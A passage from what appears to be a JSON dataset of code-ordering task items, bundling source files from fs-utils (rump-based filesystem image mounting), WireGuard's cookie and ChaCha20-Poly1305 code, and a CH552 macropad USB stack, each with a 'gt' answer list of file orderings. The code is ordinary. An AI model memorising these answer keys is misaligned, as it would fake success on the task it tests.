mount_fstype(fsu_fs_t *, const char *, char *, char *,\n    char *, struct mount_data_s *, int);\nstatic int fsu_load_fs(const char *);\n\nstatic int mount_struct(_Bool, struct mount_data_s *);\nextern int rump_i_know_what_i_am_doing_with_sysents;\n\n\nint\nfsu_mount(int *argc, char **argv[], int mode)\n{\n\tfsu_fs_t *fst;\n\tstruct fsu_fsalias_s *alias;\n\tstruct mount_data_s mntd;\n\tint idx, fflag, rv, verbose;\n\tint ch, stopopts;\n\tchar *mntopts, afsdev[PATH_MAX], *puffsexec, *specopts;\n\tchar *tmp;\n\tchar *fsdevice, *fstype;\n\tstruct stat sb;\n#ifdef WITH_SYSPUFFS\n\tconst char options[] = GETOPT_PREFIX\"f:o:p:s:t:v\";\n#else\n\tconst char options[] = GETOPT_PREFIX\"f:o:s:t:v\";\n#endif\n\n\talias = NULL;\n\tfsdevice = fstype = mntopts = puffsexec = specopts = NULL;\n\tfst = NULL;\n\tverbose = fflag = 0;\n\tstopopts = 0;\n\tmemset(&mntd, 0, sizeof(mntd));\n\tmntd.mntd_fsdevice = mntd.mntd_canon_dev;\n\n\trump_init();\n\topterr = 0;\n\n\twhile ((ch = getopt(*argc, *argv, options)) != -1) {\n\t\tswitch (ch) {\n\t\tcase 'f':\n\t\t\tif (fsdevice == NULL)\n\t\t\t\tfsdevice = optarg;\n\t\t\tfflag = 1;\n\t\t\tbreak;\n\t\tcase 'o':\n\t\t\tif (mntopts == NULL)\n\t\t\t\tmntopts = optarg;\n\t\t\tbreak;\n#ifdef WITH_SYSPUFFS\n\t\tcase 'p':\n\t\t\tif (puffsexec == NULL) {\n\t\t\t\tpuffsexec = optarg;\n\t\t\t\tfor (fst = fslist; fst->fs_name != NULL; ++fst)\n\t\t\t\t\tif (fst->fs_name == MOUNT_PUFFS)\n\t\t\t\t\t\tbreak;\n\n\t\t\t\tif (fstype == NULL)\n\t\t\t\t\tfstype = MOUNT_PUFFS;\n\t\t\t\telse if (strcmp(fstype, MOUNT_PUFFS) != 0) {\n\t\t\t\t\twarnx(\"-p is only for puffs\");\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n#endif\n\t\tcase 's':\n\t\t\tif (specopts == NULL)\n\t\t\t\tspecopts = optarg;\n\t\t\tbreak;\n\t\tcase 't':\n\t\t\tif (fstype == NULL)\n\t\t\t\tfstype = optarg;\n\t\t\tbreak;\n\t\tcase 'v':\n\t\t\t++verbose;\n\t\t\tbreak;\n\t\tcase '?':\n\t\tdefault:\n\t\t\t--optind;\n\t\t\tstopopts = 1;\n\t\t\tbreak;\n\t\t}\n\t\tif (stopopts)\n\t\t\tbreak;\n\t}\n\tidx = optind;\n\toptind = 1;\n#ifdef HAVE_GETOPT_OPTRESET\n\toptreset = 1;\n#endif\n\tif (mntopts == NULL)\n\t\tmntopts = getenv(\"FSU_MNTOPTS\");\n\n\tif (mode == MOUNT_READONLY) {\n\t\tif (mntopts == NULL)\n\t\t\tmntopts = __UNCONST(\"ro\");\n\t\telse {\n\t\t\ttmp = malloc(strlen(mntopts) + 4);\n\t\t\tif (tmp == NULL) {\n\t\t\t\twarn(NULL);\n\t\t\t\topterr = 1;\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\tsnprintf(tmp, strlen(mntopts) + 4, \"%s,ro\", mntopts);\n\t\t\tmntopts = tmp;\n\t\t}\n\t}\n\n\tif (fstype == NULL)\n\t\tfstype = getenv(\"FSU_TYPE\");\n\n\tif (fstype != NULL && fst == NULL) {\n\t\tfor (fst = fslist; fst->fs_name != NULL; ++fst)\n\t\t\tif (strcmp(fstype, fst->fs_name) == 0)\n\t\t\t\tbreak;\n\n\t\tif (fst->fs_name == NULL) {\n\t\t\tfprintf(stderr, \"%s: filesystem not supported\\n\",\n\t\t\t    fstype);\n\t\t\topterr = 1;\n\t\t\treturn -1;\n\t\t}\n\t}\n\n\tif (fsdevice == NULL) {\n\t\tfsdevice = getenv(\"FSU_DEVICE\");\n\t\tif (fsdevice == NULL) {\n\t\t\tif (idx < *argc && strcmp((*argv)[idx], \"--\") != 0)\n\t\t\t\tfsdevice = (*argv)[idx++];\n\t\t\telse {\n\t\t\t\terrno = 0;\n\t\t\t\topterr = 1;\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t}\n\t}\n\n\trv = 0;\n\tif (!fflag) {\n\t\trv = -1;\n\t\tbuild_alias_list();\n\t\talias = get_alias(fsdevice);\n\t\tif (alias != NULL)\n\t\t\trv = mount_alias(alias, mntopts, specopts, &mntd,\n\t\t\t    verbose);\n\t\tfree_alias_list();\n\t}\n\tif (fflag || alias == NULL) {\n\t\tif (realpath(fsdevice, afsdev) != NULL)\n\t\t\tfsdevice = afsdev;\n\t\trv = stat(fsdevice, &sb);\n\t\tif (rv == -1)\n\t\t\twarn(\"%s\", fsdevice);\n\t\telse if (!(S_ISREG(sb.st_mode) || S_ISBLK(sb.st_mode))) {\n\t\t\twarnx(\"%s: Not a regular file or block device\",\n\t\t\t    fsdevice);\n\t\t\trv = -1;\n\t\t} else {\n\t\t\trv = rump_pub_etfs_register(RUMPFSDEV, fsdevice,\n\t\t\t    RUMP_ETFS_BLK);\n\t\t\tif (rv != 0) {\n\t\t\t\twarnx(\"%s: rump_pub_etfs_register failed \"\n\t\t\t\t\t\t\"(error=%d)\", fsdevice, rv);\n\t\t\t} else {\n\t\t\t\tmntd.mntd_fsdevice = fsdevice;\n\t\t\t\tfsdevice = strdup(RUMPFSDEV);\n\t\t\t\trv = mount_fstype(fst, fsdevice, mntopts,\n\t\t\t\t    puffsexec, specopts, &mntd, verbose);\n\t\t\t\tif (rv == -1) {\n\t\t\t\t\twarnx(\"%s: \"\n\t\t\t\t\t    \"Invalid or unknown filesystem type\"\n\t\t\t\t\t    \", retry with -v for details\",\n\t\t\t\t\t    mntd.mntd_fsdevice);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tfree(mntd.mntd_argv);\n\tmntd.mntd_argv = NULL;\n\tmntd.mntd_argv_size = 0;\n\n\n\tif ((*argv)[idx] != NULL && strcmp((*argv)[idx], \"--\") == 0)\n\t\t++idx;\n\n\tif (--idx > 0) {\n\t\t(*argv)[idx] = (*argv)[0];\n\t\t*argv += idx;\n\t\t*argc -= idx;\n\t\toptind = 1;\n#ifdef HAVE_GETOPT_OPTRESET\n\t\toptreset = 1;\n#endif\n\t}\n\n\toptind = 1;\n#ifdef HAVE_GETOPT_OPTRESET\n\toptreset = 1;\n#endif\n\topterr = 1;\n\treturn rv;\n}\n\nstatic int\nmount_fstype(fsu_fs_t *fs, const char *fsdev, char *mntopts, char *puffsexec,\n    char *specopts, struct mount_data_s *mntdp, int verbose)\n{\n\tint argvlen;\n\n\tmntdp->mntd_fs = fs;\n\tmntdp->mntd_argc = mntdp->mntd_flags = 0;\n\n\targvlen = 7;\n\tif (specopts != NULL)\n\t\targvlen += fsu_str2argc(specopts);\n\n\tif (argvlen > mntdp->mntd_argv_size) {\n\t\tchar **tmp;\n\n\t\ttmp = realloc(mntdp->mntd_argv, argvlen * sizeof(char *));\n\t\tif (tmp == NULL) {\n\t\t\tif (mntdp->mntd_argv != NULL)\n\t\t\t\tfree(mntdp->mntd_argv);\n\t\t\treturn -1;\n\t\t}\n\t\tmntdp->mntd_argv = tmp;\n\t\tmntdp->mntd_argv_size = argvlen;\n\t}\n\n\n\tADD_ARG(mntdp, __UNCONST(getprogname()));\n\n#ifdef WITH_SYSPUFFS\n\tif (puffsexec != NULL && fs->fs_name == MOUNT_PUFFS)\n\t\tADD_ARG(mntdp, puffsexec);\n#endif\n\n\tif (mntopts != NULL) {\n\t\tADD_ARG(mntdp, __UNCONST(\"-o\"));\n\t\tADD_ARG(mntdp, mntopts);\n\t}\n\tif (specopts != NULL) {\n\t\tint tmpargc;\n\n\t\tfsu_str2arg(specopts, &tmpargc,\n\t\t    mntdp->mntd_argv + mntdp->mntd_argc, argvlen - 6);\n\t\tmntdp->mntd_argc += tmpargc;\n\t}\n\tADD_ARG(mntdp, __UNCONST(fsdev));\n\tADD_ARG(mntdp, __UNCONST(\"/\"));\n\tmntdp->mntd_argv[mntdp->mntd_argc] = NULL;\n\n\n\tif (fs != NULL)\n\t\treturn mount_struct(verbose, mntdp);\n\n\n\tfor (fs = fslist; fs->fs_name != NULL; ++fs) {\n\t\tif (verbose)\n\t\t\tprintf(\"Trying with fs %s\\n\", fs->fs_name);\n\t\tif (fs->fs_flags & FS_NO_AUTO)\n\t\t\tcontinue;\n\t\tmntdp->mntd_flags = 0;\n\t\tmntdp->mntd_fs = fs;\n\t\tif (mount_struct(verbose > 1, mntdp) == 0)\n\t\t\treturn 0;\n\t}\n\treturn -1;\n}\n\nstatic int\nmount_alias(struct fsu_fsalias_s *al, char *mntopts, char *specopts,\n    struct mount_data_s *mntdp, int verbose)\n{\n\tfsu_fs_t *cur;\n\tint argvlen;\n\n\tmntdp->mntd_argc = mntdp->mntd_flags = 0;\n\n\targvlen = 9;\n\tif (specopts != NULL)\n\t\targvlen += fsu_str2argc(specopts);\n\n\tif (argvlen > mntdp->mntd_argv_size) {\n\t\tchar **tmp;\n\n\t\ttmp = realloc(mntdp->mntd_argv, argvlen * sizeof(char *));\n\t\tif (tmp == NULL) {\n\t\t\tfree(mntdp->mntd_argv);\n\t\t\treturn -1;\n\t\t}\n\t\tmntdp->mntd_argv = tmp;\n\t\tmntdp->mntd_argv_size = argvlen;\n\t}\n\n\tADD_ARG(mntdp, __UNCONST(getprogname()));\n\n#ifdef WITH_SYSPUFFS\n\tif (al->fsa_puffsexec != NULL)\n\t\tADD_ARG(mntdp, al->fsa_puffsexec);\n#endif\n\n\tif (al->fsa_mntopt != NULL) {\n\t\tADD_ARG(mntdp, __UNCONST(\"-o\"));\n\t\tADD_ARG(mntdp, al->fsa_mntopt);\n\t\tsetenv(\"FSU_MNTOPTS\", al->fsa_mntopt, 1);\n\t}\n\tif (mntopts != NULL) {\n\t\tADD_ARG(mntdp, __UNCONST(\"-o\"));\n\t\tADD_ARG(mntdp, mntopts);\n\t\tsetenv(\"FSU_MNTOPTS\", mntopts, 1);\n\t}\n\tif (specopts != NULL) {\n\t\tint tmpargc;\n\n\t\tfsu_str2arg(specopts, &tmpargc,\n\t\t    mntdp->mntd_argv + mntdp->mntd_argc, argvlen - 8);\n\t\tmntdp->mntd_argc += tmpargc;\n\t}\n\tADD_ARG(mntdp, al->fsa_path);\n\tADD_ARG(mntdp, __UNCONST(\"/\"));\n\tmntdp->mntd_argv[mntdp->mntd_argc] = NULL;\n\n\tfor (cur = fslist; cur->fs_name != NULL; ++cur)\n\t\tif (strcmp(cur->fs_name, al->fsa_type) == 0)\n\t\t\tbreak;\n\n\tif (cur->fs_name == NULL)\n\t\treturn -1;\n\n\tmntdp->mntd_fs = cur;\n\n\treturn mount_struct(verbose, mntdp);\n}\n\nstatic int\nmount_struct(_Bool verbose, struct mount_data_s *mntdp)\n{\n\tfsu_fs_t *fs;\n\tint rv;\n\n\tfs = mntdp->mntd_fs;\n\n\n\trump_i_know_what_i_am_doing_with_sysents = 1;\n\trump_pub_lwproc_sysent_usenative();\n\n\trv = fs->fs_parseargs(mntdp->mntd_argc, mntdp->mntd_argv, fs->fs_args,\n\t    &(mntdp->mntd_flags), mntdp->mntd_canon_dev, mntdp->mntd_canon_dir);\n\tif (rv != 0)\n\t\treturn -1;\n\n\tif (rump_sys_mkdir(MOUNT_DIRECTORY, 0777) == -1 && errno != EEXIST)\n\t\terr(-1, \"mkdir\");\n\tstrcpy(mntdp->mntd_canon_dir, MOUNT_DIRECTORY);\n\n\trv = fsu_load_fs(fs->fs_name);\n\n\tif (rv == 0) {\n\t\trv = rump_sys_mount(fs->fs_name, mntdp->mntd_canon_dir,\n\t\t    mntdp->mntd_flags, fs->fs_args, fs->fs_args_size);\n#if 0\n\n\t\tif (rv == -1)\n\t\t\twarn(\"mount failed\");\n#endif\n\t}\n\n\tif (rv == 0) {\n\n\t\tif ((rv = rump_pub_lwproc_rfork(RUMP_RFCFDG)) != 0) {\n\t\t\twarnx(\"fork failed!\");\n\t\t\trump_sys_unmount(MOUNT_DIRECTORY, 0);\n\t\t} else {\n\t\t\tatexit(fsu_unmount);\n\t\t\trump_sys_chroot(MOUNT_DIRECTORY);\n\t\t}\n\t}\n#ifdef WITH_SMBFS\n\tif (strcmp(fs->fs_name, MOUNT_SMBFS) == 0) {\n\t\textern struct smb_ctx sctx;\n\n\t\tsmb_ctx_done(&sctx);\n\t}\n#endif\n\tif (rv != 0 && verbose) {\n\t\twarn(NULL);\n\t\tfprintf(stderr, \"%s is not a valid %s image\\n\",\n\t\t    mntdp->mntd_fsdevice, fs->fs_name);\n\t}\n\n\treturn rv;\n}\n\nvoid\nfsu_unmount(void)\n{\n\n\n\trump_pub_lwproc_releaselwp();\n\tif (rump_sys_unmount(MOUNT_DIRECTORY, 0) != 0)\n\t\twarnx(\"unmount failed, image may be dirty!\");\n}\n\nconst char *\nfsu_mount_usage(void)\n{\n\n#ifdef WITH_SYSPUFFS\n\treturn \"[-o mnt_args] [-s specopts] [-t fstype] [-p puffs_exec] [-f] fsdevice\";\n#else\n\treturn \"[-o mnt_args] [-s specopts] [-t fstype] [-f] fsdevice\";\n#endif\n}\n\nstatic int\nfsu_load_fs(const char *fsname)\n{\n#ifdef NO_COMPONENT_DLOPEN\n\treturn 0;\n#else\n\tchar fname[PATH_MAX + 1];\n\tvoid *handle;\n\tconst struct modinfo *const *mi_start, *const *mi_end;\n\tint error;\n\n\tsnprintf(fname, sizeof(fname) - 1, \"librumpfs_%s.so\", fsname);\n\thandle = dlopen(fname, RTLD_LAZY|RTLD_GLOBAL);\n\tif (handle == NULL)\n\t\treturn -1;\n\n\tmi_start = dlsym(handle, \"__start_link_set_modules\");\n\tmi_end = dlsym(handle, \"__stop_link_set_modules\");\n\tif (mi_start && mi_end) {\n\t\terror = rump_pub_module_init(mi_start,\n\t\t    (size_t)(mi_end-mi_start));\n\t\tif (error)\n\t\t\tgoto errclose;\n\t\treturn 0;\n\t}\n\terror = EINVAL;\n\n errclose:\n\tdlclose(handle);\n\terrno = error;\n\treturn -1;\n#endif\n}\n",
        "gt": [
            "'fs-utils/lib/mount_ext2fs.h'",
            "'fs-utils/lib/filesystems.h'",
            "'fs-utils/lib/fsu_mount.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/cookie.c'",
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'"
        ],
        "content": "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'\n:\n\n\n#ifndef _ZINC_CHACHA20POLY1305_H\n#define _ZINC_CHACHA20POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nstruct scatterlist;\n\nenum chacha20poly1305_lengths {\n\tXCHACHA20POLY1305_NONCE_SIZE = 24,\n\tCHACHA20POLY1305_KEY_SIZE = 32,\n\tCHACHA20POLY1305_AUTHTAG_SIZE = 16\n};\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_encrypt_sg_inplace(\n\tstruct scatterlist *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nbool __must_check\nchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_decrypt_sg_inplace(\n\tstruct scatterlist *src, size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check xchacha20poly1305_decrypt(\n\tu8 *dst, const u8 *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\n#endif\n\n'wireguard-linux-compat/src/cookie.c'\n:\n\n\n#include \"cookie.h\"\n#include \"peer.h\"\n#include \"device.h\"\n#include \"messages.h\"\n#include \"ratelimiter.h\"\n#include \"timers.h\"\n\n#include <zinc/blake2s.h>\n#include <zinc/chacha20poly1305.h>\n\n#include <net/ipv6.h>\n#include <crypto/algapi.h>\n\nvoid wg_cookie_checker_init(struct cookie_checker *checker,\n\t\t\t    struct wg_device *wg)\n{\n\tinit_rwsem(&checker->secret_lock);\n\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\tchecker->device = wg;\n}\n\nenum { COOKIE_KEY_LABEL_LEN = 8 };\nstatic const u8 mac1_key_label[COOKIE_KEY_LABEL_LEN] = \"mac1----\";\nstatic const u8 cookie_key_label[COOKIE_KEY_LABEL_LEN] = \"cookie--\";\n\nstatic void precompute_key(u8 key[NOISE_SYMMETRIC_KEY_LEN],\n\t\t\t   const u8 pubkey[NOISE_PUBLIC_KEY_LEN],\n\t\t\t   const u8 label[COOKIE_KEY_LABEL_LEN])\n{\n\tstruct blake2s_state blake;\n\n\tblake2s_init(&blake, NOISE_SYMMETRIC_KEY_LEN);\n\tblake2s_update(&blake, label, COOKIE_KEY_LABEL_LEN);\n\tblake2s_update(&blake, pubkey, NOISE_PUBLIC_KEY_LEN);\n\tblake2s_final(&blake, key);\n}\n\n\nvoid wg_cookie_checker_precompute_device_keys(struct cookie_checker *checker)\n{\n\tif (likely(checker->device->static_identity.has_identity)) {\n\t\tprecompute_key(checker->cookie_encryption_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       cookie_key_label);\n\t\tprecompute_key(checker->message_mac1_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       mac1_key_label);\n\t} else {\n\t\tmemset(checker->cookie_encryption_key, 0,\n\t\t       NOISE_SYMMETRIC_KEY_LEN);\n\t\tmemset(checker->message_mac1_key, 0, NOISE_SYMMETRIC_KEY_LEN);\n\t}\n}\n\nvoid wg_cookie_checker_precompute_peer_keys(struct wg_peer *peer)\n{\n\tprecompute_key(peer->latest_cookie.cookie_decryption_key,\n\t\t       peer->handshake.remote_static, cookie_key_label);\n\tprecompute_key(peer->latest_cookie.message_mac1_key,\n\t\t       peer->handshake.remote_static, mac1_key_label);\n}\n\nvoid wg_cookie_init(struct cookie *cookie)\n{\n\tmemset(cookie, 0, sizeof(*cookie));\n\tinit_rwsem(&cookie->lock);\n}\n\nstatic void compute_mac1(u8 mac1[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 key[NOISE_SYMMETRIC_KEY_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac1);\n\tblake2s(mac1, message, key, COOKIE_LEN, len, NOISE_SYMMETRIC_KEY_LEN);\n}\n\nstatic void compute_mac2(u8 mac2[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 cookie[COOKIE_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac2);\n\tblake2s(mac2, message, cookie, COOKIE_LEN, len, COOKIE_LEN);\n}\n\nstatic void make_cookie(u8 cookie[COOKIE_LEN], struct sk_buff *skb,\n\t\t\tstruct cookie_checker *checker)\n{\n\tstruct blake2s_state state;\n\n\tif (wg_birthdate_has_expired(checker->secret_birthdate,\n\t\t\t\t     COOKIE_SECRET_MAX_AGE)) {\n\t\tdown_write(&checker->secret_lock);\n\t\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\t\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\t\tup_write(&checker->secret_lock);\n\t}\n\n\tdown_read(&checker->secret_lock);\n\n\tblake2s_init_key(&state, COOKIE_LEN, checker->secret, NOISE_HASH_LEN);\n\tif (skb->protocol == htons(ETH_P_IP))\n\t\tblake2s_update(&state, (u8 *)&ip_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in_addr));\n\telse if (skb->protocol == htons(ETH_P_IPV6))\n\t\tblake2s_update(&state, (u8 *)&ipv6_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in6_addr));\n\tblake2s_update(&state, (u8 *)&udp_hdr(skb)->source, sizeof(__be16));\n\tblake2s_final(&state, cookie);\n\n\tup_read(&checker->secret_lock);\n}\n\nenum cookie_mac_state wg_cookie_validate_packet(struct cookie_checker *checker,\n\t\t\t\t\t\tstruct sk_buff *skb,\n\t\t\t\t\t\tbool check_cookie)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t(skb->data + skb->len - sizeof(*macs));\n\tenum cookie_mac_state ret;\n\tu8 computed_mac[COOKIE_LEN];\n\tu8 cookie[COOKIE_LEN];\n\n\tret = INVALID_MAC;\n\tcompute_mac1(computed_mac, skb->data, skb->len,\n\t\t     checker->message_mac1_key);\n\tif (crypto_memneq(computed_mac, macs->mac1, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_BUT_NO_COOKIE;\n\n\tif (!check_cookie)\n\t\tgoto out;\n\n\tmake_cookie(cookie, skb, checker);\n\n\tcompute_mac2(computed_mac, skb->data, skb->len, cookie);\n\tif (crypto_memneq(computed_mac, macs->mac2, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE_BUT_RATELIMITED;\n\tif (!wg_ratelimiter_allow(skb, dev_net(checker->device->dev)))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE;\n\nout:\n\treturn ret;\n}\n\nvoid wg_cookie_add_mac_to_packet(void *message, size_t len,\n\t\t\t\t struct wg_peer *peer)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)message + len - sizeof(*macs));\n\n\tdown_write(&peer->latest_cookie.lock);\n\tcompute_mac1(macs->mac1, message, len,\n\t\t     peer->latest_cookie.message_mac1_key);\n\tmemcpy(peer->latest_cookie.last_mac1_sent, macs->mac1, COOKIE_LEN);\n\tpeer->latest_cookie.have_sent_mac1 = true;\n\tup_write(&peer->latest_cookie.lock);\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (peer->latest_cookie.is_valid &&\n\t    !wg_birthdate_has_expired(peer->latest_cookie.birthdate,\n\t\t\t\tCOOKIE_SECRET_MAX_AGE - COOKIE_SECRET_LATENCY))\n\t\tcompute_mac2(macs->mac2, message, len,\n\t\t\t     peer->latest_cookie.cookie);\n\telse\n\t\tmemset(macs->mac2, 0, COOKIE_LEN);\n\tup_read(&peer->latest_cookie.lock);\n}\n\nvoid wg_cookie_message_create(struct message_handshake_cookie *dst,\n\t\t\t      struct sk_buff *skb, __le32 index,\n\t\t\t      struct cookie_checker *checker)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)skb->data + skb->len - sizeof(*macs));\n\tu8 cookie[COOKIE_LEN];\n\n\tdst->header.type = cpu_to_le32(MESSAGE_HANDSHAKE_COOKIE);\n\tdst->receiver_index = index;\n\tget_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);\n\n\tmake_cookie(cookie, skb, checker);\n\txchacha20poly1305_encrypt(dst->encrypted_cookie, cookie, COOKIE_LEN,\n\t\t\t\t  macs->mac1, COOKIE_LEN, dst->nonce,\n\t\t\t\t  checker->cookie_encryption_key);\n}\n\nvoid wg_cookie_message_consume(struct message_handshake_cookie *src,\n\t\t\t       struct wg_device *wg)\n{\n\tstruct wg_peer *peer = NULL;\n\tu8 cookie[COOKIE_LEN];\n\tbool ret;\n\n\tif (unlikely(!wg_index_hashtable_lookup(wg->index_hashtable,\n\t\t\t\t\t\tINDEX_HASHTABLE_HANDSHAKE |\n\t\t\t\t\t\tINDEX_HASHTABLE_KEYPAIR,\n\t\t\t\t\t\tsrc->receiver_index, &peer)))\n\t\treturn;\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (unlikely(!peer->latest_cookie.have_sent_mac1)) {\n\t\tup_read(&peer->latest_cookie.lock);\n\t\tgoto out;\n\t}\n\tret = xchacha20poly1305_decrypt(\n\t\tcookie, src->encrypted_cookie, sizeof(src->encrypted_cookie),\n\t\tpeer->latest_cookie.last_mac1_sent, COOKIE_LEN, src->nonce,\n\t\tpeer->latest_cookie.cookie_decryption_key);\n\tup_read(&peer->latest_cookie.lock);\n\n\tif (ret) {\n\t\tdown_write(&peer->latest_cookie.lock);\n\t\tmemcpy(peer->latest_cookie.cookie, cookie, COOKIE_LEN);\n\t\tpeer->latest_cookie.birthdate = ktime_get_coarse_boottime_ns();\n\t\tpeer->latest_cookie.is_valid = true;\n\t\tpeer->latest_cookie.have_sent_mac1 = false;\n\t\tup_write(&peer->latest_cookie.lock);\n\t} else {\n\t\tnet_dbg_ratelimited(\"%s: Could not decrypt invalid cookie response\\n\",\n\t\t\t\t    wg->dev->name);\n\t}\n\nout:\n\twg_peer_put(peer);\n}\n\n'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/cookie.c'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/usb_descr.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb.h\"\n#include \"config.h\"\n\n\n\n\n#define EP0_SIZE        8\n#define EP1_SIZE        8\n#define EP2_SIZE        8\n\n#define EP0_ADDR        0\n#define EP1_ADDR        (EP0_ADDR + EP0_BUF_SIZE)\n#define EP2_ADDR        (EP1_ADDR + EP1_BUF_SIZE)\n\n#define EP0_BUF_SIZE    EP_BUF_SIZE(EP0_SIZE)\n#define EP1_BUF_SIZE    EP_BUF_SIZE(EP1_SIZE)\n#define EP2_BUF_SIZE    EP_BUF_SIZE(EP2_SIZE)\n\n#define EP_BUF_SIZE(x)  (x+2<64 ? x+2 : 64)\n\n\n\n\ntypedef struct _USB_CFG_DESCR_HID {\n  USB_CFG_DESCR config;\n  USB_ITF_DESCR interface0;\n  USB_HID_DESCR hid0;\n  USB_ENDP_DESCR ep1IN;\n  USB_ENDP_DESCR ep2OUT;\n} USB_CFG_DESCR_HID, *PUSB_CFG_DESCR_HID;\ntypedef USB_CFG_DESCR_HID __xdata *PXUSB_CFG_DESCR_HID;\n\nextern __code USB_DEV_DESCR DevDescr;\nextern __code USB_CFG_DESCR_HID CfgDescr;\n\n\n\n\nextern __code uint8_t ReportDescr[];\nextern __code uint8_t ReportDescrLen;\n\n#define 